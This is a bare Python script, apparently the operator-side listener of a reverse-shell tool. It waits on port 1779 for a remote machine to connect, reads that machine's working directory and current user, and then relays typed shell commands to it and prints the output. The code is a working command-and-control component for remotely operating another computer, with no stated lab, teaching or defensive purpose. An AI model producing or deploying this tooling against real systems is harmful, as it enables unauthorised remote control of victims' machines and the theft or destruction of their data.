import socket;

serverHost = "0.0.0.0";
serverPort = 1779;
bufferSize = 1024 * 128;
separator = "<sep>";
s = socket.socket();

s.bind((serverHost, serverPort));

s.listen(5);
print(f"Listening as {serverHost}:{serverPort} ...");

clientSocket, clientAddress = s.accept();
print(f"{clientAddress[0]}:{clientAddress[1]} Connected!");

cwd, whoami = clientSocket.recv(bufferSize).decode().split(separator);
print();
print("[+] Current working directory:", cwd);
print("[+] Current user:", whoami);
print();

while True:
    command = input(f"{whoami}:{cwd}$ ");
    if not command.strip():
        continue;
    clientSocket.send(command.encode());
    if command.lower() == "exit":
        break;
    output = clientSocket.recv(bufferSize).decode();
    results, cwd= output.split(separator);
    print(results);
s.close();
